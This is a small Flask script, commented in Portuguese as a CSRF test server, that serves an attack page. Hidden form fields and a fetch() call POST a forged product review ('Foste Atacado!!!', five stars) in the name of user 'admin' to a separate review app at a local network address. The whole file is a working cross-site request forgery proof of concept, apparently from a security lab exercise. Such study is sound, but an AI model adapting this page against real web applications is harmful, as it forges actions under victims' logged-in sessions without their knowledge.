# SERVIDOR DE TESTE PARA ATAQUES DE CSRF

from flask import Flask, render_template_string
# from flask_cors import CORS

app = Flask(__name__)

@app.route('/')
def csrf_attack():
    html_content = '''
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>CSRF Attack Test</title>
    </head>
    <body>
        <h1>CSRF Attack Test</h1>
        <form id="csrfForm">
            <input type="hidden" id="reviewText" name="reviewText" value="Foste Atacado!!!!!!!!!.">
            <input type="hidden" id="reviewStars" name="reviewStars" value="5">
            <input type="hidden" id="productName" name="productName" value="Copos Cartão Descartáveis DETI">
            <input type="hidden" id="username" name="username" value="admin">
            <button type="submit">Submit</button>
        </form>

        <script>
            document.getElementById('csrfForm').addEventListener('submit', function (e) {
                e.preventDefault();

                const reviewText = document.getElementById('reviewText').value;
                const reviewStars = document.getElementById('reviewStars').value;
                const productName = document.getElementById('productName').value;
                const username = document.getElementById('username').value;

                fetch('http://192.168.1.112:5000/submit_review', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    reviewText: reviewText,
                    reviewStars: reviewStars,
                    productName: productName,
                    username: username
                })
                })
                .then(response => response.json())
                .then(data => {
                alert(data.message);
                if (data.success) {
                    // Optionally, refresh the page to show the new review
                    location.reload();
                }
                })
                .catch(error => console.error('Error:', error));
            });
        </script>
    </body>
    </html>
    '''
    return render_template_string(html_content)

if __name__ == '__main__':
    app.run(debug=True, host="0.0.0.0", port=5001)
